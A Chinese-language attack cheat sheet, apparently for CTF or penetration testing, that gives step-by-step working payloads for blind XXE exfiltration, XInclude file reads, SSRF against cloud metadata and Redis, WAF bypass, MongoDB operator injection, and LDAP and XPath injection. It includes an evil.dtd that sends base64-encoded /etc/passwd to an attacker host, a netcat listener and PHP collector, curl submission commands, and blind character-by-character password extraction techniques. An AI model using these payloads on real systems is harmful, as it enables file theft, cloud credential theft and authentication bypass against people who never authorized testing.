## [g5] XXE——XML 外部实体：本地读文件、盲外带、SSRF 三面
### [xxe-blind] 盲 XXE 外带完整模板 | medium | XXE;盲注;外带 | blind xxe;oob xxe
> 无回显时用外部 DTD 把文件内容外带到攻击者服务器

#### 这个条目的作用

普通 XXE（`<!ENTITY xxe SYSTEM "file:///etc/passwd">` 然后 `&xxe;`）需要解析结果回显在页面上。靶机把解析结果丢弃、页面只返回"成功/失败"时，这叫**盲 XXE（blind XXE）**。本条目教你怎么用「外部 DTD + 外带（OOB）」把文件内容偷偷发到你自己控制的服务器上，全程四步：**建 DTD → 起监听 → 提交 payload → 看结果**。

#### 前置条件

- 一个你能控制的外网服务器（VPS），或至少一台能开端口监听的机器（本机 NAT 环境用内网穿透也可）。记下它的 IP 或域名，下文用 `attacker:8000` 代替。
- 靶机能访问外网（能请求到你的服务器），否则外带不通，只能走时间盲注。
- 目标接口接受 XML，且外部实体没有被完全禁用（禁用时看 [xxe-adv] 的 XInclude）。
- 本机装有 `nc`（Netcat）用于监听，或者一个简单的 HTTP 收集脚本。

#### 第 1 步：起监听，确认自己服务器可达

先在攻击者机器上开一个 TCP 监听，端口 8000：

```bash
nc -lvnp 8000
```

预期结果：终端停在 `Listening on 0.0.0.0:8000` 不动。用浏览器或 curl 访问 `http://attacker:8000/test`，监听窗口里出现一行 `GET /test HTTP/1.1`，说明靶机能访问到你（如果靶机在云上而你本机没公网 IP，这一步就会失败，需要换成有公网 IP 的 VPS 或内网穿透）。

> [!tip] 外带数据较长时 `nc` 也能收到完整 HTTP 请求行，但更方便的是放一个收集脚本（第 4 步给 PHP 版），把参数自动存文件。

如果不行：检查防火墙/安全组是否放行 8000 端口；确认用的是公网 IP 而非内网 IP。

#### 第 2 步：在自己服务器上放置 evil.dtd

在攻击者机器的 Web 根目录（或任意可被 HTTP 访问的目录）创建 `evil.dtd`：

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker:8000/collect?d=%file;'>">
%eval;
%exfil;
```

逐行解释：

| 行 | 作用 |
|---|---|
| 第 1 行 | 定义参数实体 `%file`，用 PHP 伪协议**先 base64 编码再读** `/etc/passwd`。base64 是为了让内容全是 URL 安全字符，直接外带原始文件会被换行、引号、空格破坏 |
| 第 2 行 | 定义参数实体 `%eval`，其值是一段声明另一个实体 `exfil` 的 DTD 文本。**`%` 在 DTD 内部文本里必须写成 `&#x25;`**（十六进制实体），否则解析器把 `%exfil;` 当参数实体引用直接报错 |
| 第 3-4 行 | 触发 `%eval;` 让 `exfil` 实体真正被声明，再触发 `%exfil;`，把 `%file` 的值拼进 URL 发 HTTP 请求到你服务器 |

> [!danger] 关键规则：**参数实体（`%file`）只能在外部 DTD 里引用**，所以这段模板必须放在攻击者服务器上由靶机远程加载，不能塞进靶机提交的 DOCTYPE 里（那里只能写 `%remote;` 这种加载指令）。

预期结果：浏览器访问 `http://attacker:8000/evil.dtd` 能看到这段 XML 原文。

如果不行：确认服务器静态文件目录路径写对；确认没有把 `&#x25;` 手写成 `%`。

#### 第 3 步：构造并提交靶机 payload

在靶机那边提交（POST 到目标接口，Content-Type 记得改 `application/xml`）：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker:8000/evil.dtd"> %remote;]>
<foo>1</foo>
```

逻辑：靶机解析这个 DOCTYPE 时，`%remote;` 触发它去**加载攻击者服务器上的 evil.dtd**，evil.dtd 里的 `%file`/`%eval`/`%exfil` 依次执行，最终把 base64 后的文件内容通过 HTTP GET 打到你的监听端口。

```bash
curl -X POST http://target/parse -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker:8000/evil.dtd"> %remote;]><foo>1</foo>'
```

预期结果：页面可能报错也可能正常返回（盲注不需要回显），关键看第 4 步的监听窗口。

如果不行：接口可能要求别的字段名/路径，先在 Burp 里看正常请求的 XML 结构，把 `<foo>1</foo>` 换成它的根标签；target 的 URL 写全协议别漏 `http://`。

#### 第 4 步：看监听结果，收集数据

回到 `nc -lvnp 8000` 窗口，会看到类似：

```txt
GET /collect?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4K
```

`d=` 后面那一长串就是 base64 编码的 `/etc/passwd`。

如果是 HTTP 收集脚本（PHP 版 `collect.php` 放在攻击者 Web 目录）：

```php
<?php
file_put_contents("data.txt", (isset($_GET["d"]) ? $_GET["d"] : "") . "\n", FILE_APPEND);
?>
```

然后访问 `http://attacker:8000/collect.php` 就能让靶机把数据打到 `data.txt`。用 `tail -f data.txt` 实时看落盘。

> [!warn] 一次提交只能外带一个文件内容（URL 长度有限制），读大文件要分片或用别的手段；内容超长时 base64 后的 URL 可能被服务器截断，优先选小目标（如 `/etc/hostname`、`/flag`）。

如果不行：监听窗口没有请求 → 检查第 3 步的 XML 是否被接口拒绝、靶机是否能出网；有请求但 `d=` 为空 → 换一个确定存在的文件路径试。

#### 第 5 步：解码拿到明文

把 `d=` 后面的字符串复制出来解码：

```bash
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==' | base64 -d
```

预期结果：终端输出 `/etc/passwd` 明文内容。换文件时只改 evil.dtd 第 1 行的 `resource=` 路径（如 `php://filter/read=convert.base64-encode/resource=/flag`），重复第 3-5 步。

> [!tip] 目标不是 PHP 环境时，第 1 行直接用 `file:///etc/passwd`（去掉 php filter 那层）即可，base64 编码那步是为了防特殊字符，纯文件路径短时可以省。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 监听窗口没有任何请求 | 靶机不出网 / 端口被防火墙拦 / 接口不解析外部实体 | 确认安全组放行；用 dnslog 测出网；换 XInclude（见 xxe-adv） |
| 有请求但 `d=` 参数为空 | 文件路径不存在或权限不足；URL 被截断 | 换确定存在的文件（`/etc/hostname`）；读小文件 |
| XML 解析直接报错 | DTD 里 `%` 没转义成 `&#x25;`；参数实体写在内部子集 | 检查 evil.dtd 第 2 行；`%file` 引用必须在外部 DTD |
| 提交后页面 500 | payload 的根标签与接口期待不符 | 用 Burp 抓正常请求，替换成原 XML 的根标签 |
| base64 解码出来是乱码 | 目标不是 PHP，php filter 不生效 | 改成 `file:///etc/passwd` 直接读 |

#### 实战要点

- 参数实体的引用规则是盲 XXE 最容易踩的坑：`%file;` 只能在外部 DTD 里，因此完整模板必须放攻击者服务器。
- 所有外带数据先 base64，flag 的花括号、空格、换行会直接破坏 URL 和 DNS 外带。
- 外带目标必须是自己可控的服务器或 dnslog，别打公网未知主机（可能造成攻击第三方）。
- 读文件失败时先降级测连通性：把 evil.dtd 里改成固定字符串外带，确认链路通再读文件。
- 接口只认 JSON 时，把 Content-Type 改成 `application/xml` 直接提交 XML body 往往就能切换测试面。
- 一次提交一个目标文件；拿到 `d=` 立刻解码验证，确认通后再批量换路径。

### [xxe-adv] XInclude 与解析器差异 | medium | XXE;XInclude;SSRF | xxe ssrf
> DTD 被禁时用 XInclude，解析器默认差异与 SSRF 变体

#### 这个条目的作用

上一节的基础 XXE 依赖 `<!DOCTYPE>` 外部实体，但很多靶机/中间件会**禁用外部实体**（`LIBXML_NOENT` 没开、Java `setFeature` 关闭、WAF 过滤 `<!ENTITY` 等），基础 payload 直接失效。本条目教三种继续打的思路：**XInclude（不依赖 DTD）**、**解析器默认差异判定**、**SSRF 变体**，以及**过滤器/WAF 绕过**。

#### 前置条件

- 已确认目标是 XML 解析场景（XML 上传、SOAP、配置文件导入、Office 文档解析等）。
- 基础 XXE payload 失败（说明 DTD/外部实体被限制）或想直接验证解析器行为。
- 目标能出网（测 SSRF 时目标要能访问内网/云元数据地址）。

#### 第 1 步：DTD 被禁时改用 XInclude

XInclude 是 XML 标准里「把另一个文档包含进来」的机制，**它不经过 DTD，不依赖实体**，很多只拦 `<!ENTITY` 的过滤器拦不住它。在 XML 里加命名空间并声明 `<xi:include>`：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="php://filter/read=convert.base64-encode/resource=/var/www/html/index.php"/>
</foo>
```

预期结果：`<foo>` 标签之间出现文件内容（`parse="text"` 表示按纯文本包含，不会把文件内容当 XML 再解析报错）。

> [!tip] 只有部分解析器/库默认启用 XInclude（Python lxml 默认支持、Java 需显式开、PHP 要 `LIBXML_XINCLUDE`），失败不代表没戏，继续第 2 步判定解析器。

如果不行：接口可能在把 XML 转成 DOM 前过滤了 `xi:` 前缀或 `include` 关键字，换第 4 步的编码绕过。

#### 第 2 步：确认解析器默认行为

不同解析器对「是否默认读外部实体」差异极大，**报洞前必须先确认解析器实际配置**，这一步决定后面 payload 怎么写：

| 解析器 | 默认读实体 | 备注 |
|---|---|---|
| Python lxml | 是 | 高发，直接试基础 XXE |
| Python defusedxml / xml.etree | 否 | 安全库，默认免疫 |
| PHP DOMDocument / simplexml | 视配置 | 需要 `LIBXML_NOENT` 才解析实体 |
| Java DocumentBuilder | 否 | 默认不加载外部实体，需 `setFeature` 开启 |
| .NET XmlDocument | 否 | 新版默认禁止 DTD |

判定方法：先提交基础读文件 payload（见 xxe-read 条目），能读到文件 = 实体开启；读不到但页面不报错 = 可能盲注或未开启；报错 `DOCTYPE is disallowed` 之类 = DTD 被禁，走 XInclude 或错误型 XXE。

> [!warn] 解析器默认行为直接决定可利用性：Java/.NET 默认禁实体时，基础 XXE 无效是「配置如此」不是「payload 写错」，别反复试浪费时间，直接换攻击面。

#### 第 3 步：SSRF 变体

XML 外部实体除了读文件，还能让服务器替你去请求任意 URL——**SSRF**。实体值换成内网地址即可：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">
```

| 目标 | 用途 |
|---|---|
| `http://169.254.169.254/latest/meta-data/` | 云厂商元数据（阿里云/腾讯云/AWS），可能拿到临时密钥 |
| `http://127.0.0.1:6379/` | 探测本机 Redis |
| `http://127.0.0.1:8080/` | 探测本机 Web 服务 |
| `gopher://` | 向 TCP 服务发任意数据（仅部分语言支持） |

预期结果：回显内容变成内网服务的响应体，或通过响应时间差/报错信息判断端口是否开放。回显不了时用盲 XXE 那套外带模板把响应打出来。

> [!danger] 云元数据地址各厂商不同（AWS 是 169.254.169.254，阿里云也是但路径/header 有差异），先拿 `http://169.254.169.254/` 探活再深挖；打内网前先确认授权范围。

#### 第 4 步：过滤器/WAF 绕过

WAF 常拦 `file://`、`<!ENTITY`、`SYSTEM` 等关键字，常见绕过：

**关键字过滤**——换协议包装器，`file://` 被拦就换 `php://filter`，`SYSTEM` 被拦就试试无实体路径（XInclude 的 `href` 用相对/编码形式）：

```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "file:///proc/self/root/etc/passwd">
```

**编码绕过**——WAF 按 UTF-8 正则匹配时，把整个 XML 转成 UTF-16 编码提交，正则直接失效：

```bash
# 把 payload 文件转 UTF-16 再提交
iconv -f UTF-8 -t UTF-16 payload.xml | curl -X POST http://target/parse \
  -H 'Content-Type: application/xml' --data-binary @-
```

**参数实体间接引用**——`<!ENTITY` 关键字被拦时，用参数实体包一层（仅当外部 DTD 可用时）：

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
```

预期结果：页面出现文件内容、报错泄露路径、或响应异常，即绕过成功。

> [!tip] XML 大小写敏感，`File://` 之类大小写变形无效；别浪费时间，优先编码层和协议层绕过。

#### 第 5 步：错误型 XXE（报错回显）

目标不回显解析结果但**解析错误会回显**时，构造一个「读文件 → 拼进实体 → 故意触发解析错误」的链条，让文件内容出现在报错里：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>1</foo>
```

预期结果：报错信息里出现 `file:///nonexistent/root:x:0:0:...` 之类的路径+文件内容拼接（实际文件内容会被塞进错误路径里回显）。同样要求外部 DTD 场景才能引用 `%file`，且报错开关打开。

如果不行：接口吞掉所有报错，改用外带模板（见 xxe-blind）。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| XInclude 提交后无任何反应 | 解析器未启用 XInclude | 换回 DTD 实体或错误型 XXE |
| `xi:` 前缀报「未定义」 | 根标签没加命名空间 | 确认 `xmlns:xi="http://www.w3.org/2001/XInclude"` 写对 |
| 基础 XXE 一直失败 | 解析器默认禁实体（Java/.NET） | 别硬试，走 XInclude/SSRF/错误型 |
| 元数据地址无响应 | 不在云环境或地址不对 | 先探 `http://169.254.169.254/` 连通性 |
| UTF-16 提交后乱码报错 | 只转了 body 没改 Content-Type/编码声明 | `<?xml version="1.0" encoding="UTF-16"?>` 声明与 body 编码一致 |
| 错误型 XXE 无回显 | 解析器关闭了错误输出 | 改用盲 XXE 外带链路 |

#### 实战要点

- 先判解析器再选 payload：lxml/PHP 直接实体，Java/.NET 走 XInclude 或找别的解析入口，别在错误路线上耗时间。
- XInclude 不依赖 DTD，是「外部实体被禁」场景的第一选择；`parse="text"` 防文件内容被二次解析。
- SSRF 变体优先级：云元数据（可能直接拿密钥）＞ 本机服务探测 ＞ 内网横向。
- WAF 绕过按 编码层（UTF-16）→ 协议层（php filter/expect）→ 结构层（参数实体/XInclude）顺序试。
- 错误型 XXE 是把回显关掉的场景下最优雅的解法，但依赖报错开关，不行就外带。
- 每换一种 payload 都先用小而确定的目标（`/etc/hostname`）验证链路，再上敏感文件。

## [g6] NoSQL 与 LDAP/XPATH——MongoDB 与 LDAP/XPath：结构注入与布尔盲注
### [nosql-auth] MongoDB $ne 认证绕过 | easy | NoSQL;MongoDB;认证绕过 | nosql injection
> 把登录字段改成查询对象，$ne/$gt 恒真绕过

#### 这个条目的作用

传统 SQL 注入靠拼字符串，而 **NoSQL（MongoDB）查询天然接受「对象」而不是「字符串」**。如果后端把前端传来的 JSON 或表单参数**原样当成查询条件**，你就能把 `username` 从 `"admin"` 换成 `{"$ne": null}` 这种查询对象——`$ne` 表示「不等于」，`null` 表示空，于是「用户名不等于空」恒为真，直接绕过密码校验登录任意账号。本条目讲三种投递形态：**JSON body、表单参数类型混淆、$gt/$regex 变体**。

#### 前置条件

- 一个登录接口（或任何接受 `username`/`password` 之类字段的接口）。
- 能确定（或猜测）后端是 MongoDB：报错信息含 `Mongo`、接口是 Node.js/Express（`req.body` 直接传给 `find()`）、或特征字段名。
- 能拦截/修改请求的工具（Burp Suite 或 curl 都行）。

#### 第 1 步：确认后端是 MongoDB 且参数原样进查询

先正常登录一次，抓包看请求体。如果是 JSON：

```json
{"username": "admin", "password": "123456"}
```

后端伪代码（有这类写法就中招）：

```js
// Node.js 常见写法：直接把 body 当查询条件
db.users.findOne({ username: req.body.username, password: req.body.password });
```

预期结果：确认字段名（`username`/`password`）和投递格式（JSON body 还是表单）。后端用 `$` 开头的键名去查 MongoDB 时，MongoDB 会把它当**运算符**解析——这就是漏洞根源。

如果不行：后端可能做了类型校验（如强制 `String` 转换），那这条路不通，试第 3 步的形态或换注入点。

#### 第 2 步：JSON body 直接挂 $ne 绕过

把请求体改成：

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

预期结果：直接登录成功（一般进入 admin 或第一个匹配的账号）。原理：`username != null` 对任何有值的文档都为真，`password != null` 同理，两个恒真条件 AND 起来还是真。

如果不行：接口要求 `username` 必须是字符串（做了类型校验），试第 4 步变体或第 3 步表单形态。

#### 第 3 步：表单/GET 参数类型混淆（PHP/Express 特供）

后端如果是 PHP（`$_POST`）或部分 Express 配置，表单参数里的 `[键]` 语法会被解析成**嵌套数组**，同样变成查询对象：

```txt
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=x
```

```txt
GET /api/user?id[$gt]=0
```

预期结果：密码字段变成 `{"$ne": "x"}` 传给 MongoDB，恒真绕过；`id[$gt]=0` 让 ID 大于 0 的所有用户都匹配（可能泄露整个用户列表）。

> [!tip] 同一接口把 Content-Type 从 JSON 换成表单、或反之，都各试一次——后端解析路径不同，常常一种形态被拦另一种能过。

如果不行：响应提示 400 或字段格式错误，说明后端把参数强转字符串了，换 JSON 形态或别的运算符。

#### 第 4 步：$gt / $regex 变体

`$ne` 被过滤或想更精准时，换等价的恒真运算符：

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

```json
{"username": "admin", "password": {"$regex": ".*"}}
```

| Payload | 含义 |
|---|---|
| `{"$ne": null}` | 不等于空，最常用 |
| `{"$gt": ""}` | 大于空字符串，所有非空值都满足 |
| `{"$regex": ".*"}` | 正则匹配任意，配 `"admin"` 用户名精确打管理员 |
| `{"$exists": true}` | 字段存在即真 |

预期结果：`{"username":"admin","password":{"$regex":".*"}}` 能绕过密码并以 admin 身份登录——这是打**指定账号**（而非第一个用户）的姿势，比 `$ne` 更可控。

> [!warn] `$regex` 还能做逐字符盲注（配合响应差异猜密码），但那属于 nosql-ldap-xpath 条目的内容，这里先掌握绕过登录。

#### 第 5 步：验证绕过结果

登录成功后立即验证身份：响应里的 token/cookie、跳转到的页面、返回的用户对象是否含 `admin` 字段或管理权限接口。再用绕过后的身份访问敏感接口（如 `/api/users`、`/admin`），确认不是「登录了但没权限」。

预期结果：拿到 admin 会话，且能访问到普通账号访问不了的接口。如果只能登录但没管理权限，把第 4 步的 `"username"` 换成枚举到的真实管理员用户名（`{"username":"root","password":{"$ne":null}}` 逐个试）。

如果不行：可能 admin 用户名未知，配合第 3 步 `id[$gt]=0` 之类先拉用户列表再打。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 提交 JSON 后报 400 | 后端要求表单格式或字段强转 | 换 `Content-Type: application/x-www-form-urlencoded` 形态 |
| `$ne` 不生效，仍提示密码错 | 后端把输入 `String()` 强转了 | 确认后端版本；试表单数组语法 `password[$ne]=x` |
| 登录成功但不是管理员 | `$ne` 匹配到第一个普通用户 | 用 `{"username":"admin","password":{"$regex":".*"}}` 指定账号 |
| 响应 500 且报 Mongo 语法错 | 运算符放错位置（如放数组里） | 确认结构是 `{"字段": {"$op": 值}}` |
| 接口把 `$` 当普通字符转义 | 后端做了 `$` 过滤 | 试 `{"$gt":""}` 之外的大小写/编码变体，或换注入点 |

#### 实战要点

- 核心思路就一句：**把「值」换成「查询对象」**，`$ne`/`$gt`/`$regex` 三选一，恒真条件即可绕过。
- JSON body 与表单参数两种形态都要试，PHP/Express 对 `[key]` 的解析差异是常见入口。
- 打指定账号用 `$regex` 配用户名，比 `$ne` 盲匹配第一个用户更可控。
- 认证绕过只是起点：登录后继续测越权接口，NoSQL 接口常把整张表数据泄露出来。
- `$ne: null` 不等于空，`$ne: ""` 更严格（排除空字符串），靶机怪癖时换着试。
- 所有 payload 先在正常请求上改一处字段验证响应差异，别一次性全改。

### [nosql-ldap-xpath] NoSQL 运算符与 LDAP/XPath | medium | NoSQL;LDAP;XPath | ldap injection;xpath injection
> MongoDB 运算符盲注与 LDAP/XPath 注入要点

#### 这个条目的作用

认证绕过（见 nosql-auth）只是 NoSQL 注入的一半，另一半是**用运算符做布尔盲注**——响应差异（登录成功/失败、长度、报错）当布尔值，逐字符猜出密码。本条目还覆盖两类相似的**结构注入**：LDAP 过滤器注入（`(&(uid=USER)(password=PASS))` 拼接场景）和 XPath 注入（XML 查询 `//user[name='...']` 拼接场景），它们和 NoSQL 一样靠「闭合 + 恒真/盲注」打。

#### 前置条件

- NoSQL：已确认 MongoDB 后端且参数进查询（认证绕过那套已通，或至少响应差异可控）。
- LDAP：登录/查询接口拼接 `(&(uid=USER)(password=PASS))` 或类似过滤器模板。
- XPath：接口把用户输入拼进 `//user[name='...']` 这类 XPath 表达式。

#### 第 1 步：NoSQL 运算符盲注——先摸清响应差异

先建立「布尔探针」：`{"username":{"$regex":"^a"},"password":{"$ne":null}}` 与 `{"username":{"$regex":"^z"},"password":{"$ne":null}}` 各提交一次。

| 运算符 | 含义 | 盲注用法 |
|---|---|---|
| `$gt` / `$lt` | 大于 / 小于 | `{"$gt":"m"}` 猜首字母范围 |
| `$regex` | 正则匹配 | `{"$regex":"^fla"}` 逐字符猜前缀 |
| `$where` | JS 表达式（布尔） | `{"$where":"this.password.length==8"}` 猜长度 |
| `$exists` | 字段存在性 | 枚举字段名 |

预期结果：两个请求响应不同（一个提示成功/返回数据、一个失败），说明可以用正则前缀做逐字符盲注：`^a` 通就试 `^ab`、`^abc`… 像 SQL 盲注一样一位位推。

> [!tip] 盲注速度慢，先猜长度（`$where` 或 `$regex:"^.{8}$"` 或 `{"$regex":"^.{N}$"}`），再对每位做二分（`{"$regex":"^a[a-m]"}` 之类），比逐字符线性快一倍以上。

如果不行：响应完全一致（无差异），说明没有可观察的布尔侧信道，看接口是否返回不同状态码/响应长度，或改用时间盲注（MongoDB 的 `$where` 里 `sleep`）。

#### 第 2 步：$where JS 注入（RCE 前哨）

`$where` 会让 MongoDB 把字符串当 **JavaScript 表达式**执行，注入 JS 能做布尔盲注甚至（配合旧版本/特殊配置）命令执行：

```json
{"$where": "this.username == 'admin' && this.password.length > 5"}
```

```json
{"username": {"$ne": null}, "$where": "sleep(5000)"}
```

预期结果：第一个返回是否匹配（布尔），第二个响应延迟 5 秒（时间盲注）。

> [!warn] `$where` 注入能触达 JS 引擎，是 NoSQL 注入里最危险的一档，报洞等级高于普通运算符盲注；但现代 MongoDB 对 `$where` 限制较多，先确认接口真的把 `$where` 传进查询了。

如果不行：`$where` 被后端从参数里剔除（白名单只留 username/password），退回到第 1 步的 `$regex` 盲注。

#### 第 3 步：LDAP 注入——闭合过滤器

LDAP 登录查询长这样（后端拼接）：

```php
$filter = "(&(uid=" . $_POST["user"] . ")(password=" . $_POST["pass"] . "))";
```

注入思路：**闭合括号 + 构造恒真条件 + 注释掉尾部**：

```txt
uid=*                  # 恒真：匹配所有用户
admin)(|(uid=*))       # 闭合：uid=admin) (|(uid=*)) 剩下尾部被 () 吃掉
*)(uid=*))(|(uid=*     # 花式闭合
```

逐个解释：

| Payload | 拼出来的过滤器 | 效果 |
|---|---|---|
| `user=*` | `(&(uid=*)(password=任意))` | 匹配所有用户，绕过 |
| `user=admin)(\|(uid=*))` | `(&(uid=admin)(\|(uid=*))(password=...))` | admin 分支 OR 恒真分支，登录 admin |
| `user=*)(&` + `pass=)` 组合 | 双闭合 | 过滤器变形技巧 |

预期结果：`user=*` 直接登录成功；`admin)(|(uid=*))` 则以 admin 身份登录。和 SQL 一样，先确认拼接模板（报错/文档泄露 `(&(uid=...` 结构），再决定闭合几个括号。

> [!tip] LDAP 过滤器对特殊字符（`*()\|&`）敏感，很多实现直接拒绝非法过滤器报错——报错本身也是信息：能区分「过滤器语法错」和「用户不存在」就能做盲注。

如果不行：后端用 LDAP 库的转义函数（如 `ldap_escape`）处理了输入，直接注入失败，改找查询里没转义的字段或改用通配符枚举（`uid=a*`、`uid=b*` 逐字母爆破用户名）。

#### 第 4 步：XPath 注入与盲注

XPath 注入发生在 XML 查询拼接场景，比如 `//user[name='<input>' and password='<input>']`：

```txt
' or '1'='1
' or 1=1 or '
```

预期结果：`' or '1'='1` 让条件恒真，返回所有 user 节点——登录绕过或数据泄露（XML 里所有用户数据直接回显）。

无回显时做**逐字符盲注**（布尔：是否返回结果）：

```txt
//user[name='admin' and substring(password,1,1)='f']
//user[name='admin' and string-length(password)=8]
//user[name='admin' and substring(password,1,1)>'m']
```

预期结果：`string-length` 先猜密码长度，`substring(password,1,1)='f'` 逐位猜字符，响应差异（是否匹配到节点）当布尔值。配合二分（`substring(...)>'m'`）提速。

> [!danger] LDAP/XPath 盲注按字符线性探测极慢：先 `string-length` 猜总长度，再对每位做二分比较，用布尔差判定；别一个字符一个字符从头线性推。注意 XPath 的字符串比较是字典序，`>` 比较要在同长度下才可靠。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| `$regex` 盲注响应无差异 | 后端把 `$` 运算符剥掉了 | 确认参数真进了 MongoDB 查询；换 `$where` 或字段枚举 |
| LDAP 报「invalid filter」 | 括号数量/特殊字符闭合错 | 用 Burp 抓正常过滤器，照着模板数括号再闭合 |
| LDAP 注入成功但登录任意账号 | 只绕过了认证，匹配到第一个用户 | 用 `admin)(|(uid=*))` 指定管理员 |
| XPath 盲注总超时 | 线性逐字符太慢 | 先 `string-length` 猜长度，再二分 |
| `substring(...)>'m'` 结果不准 | 字典序比较在不同长度下失真 | 先确认该位字符范围，或用 `=` 精确匹配 |
| 所有注入都无效 | 后端用了安全库（ldap_escape、参数化 XPath） | 该字段没戏，找别的未转义字段/接口 |

#### 实战要点

- NoSQL 盲注三板斧：`$regex` 前缀猜字符、`$where` 猜长度/时间盲注、`$gt/$lt` 二分范围——先长度后二分，效率翻倍。
- `$where` 是 JS 执行点，报洞等级高于普通运算符注入，发现后优先深挖。
- LDAP 注入先抓真实过滤器模板再闭合括号；`*` 通配符还能爆破用户名。
- XPath 盲注的 `substring`/`string-length` 是核心函数，配合二分把 52+ 次线性探测降到 ~6 次/位。
- 三种注入的共性：先找「响应差异」，再谈「盲注」；没有差异就找时间侧信道或错误回显。
- 报洞时区分清楚：认证绕过（高）、运算符盲注泄露数据（中高）、$where JS 注入（高危），别把 $where 当普通盲注报。
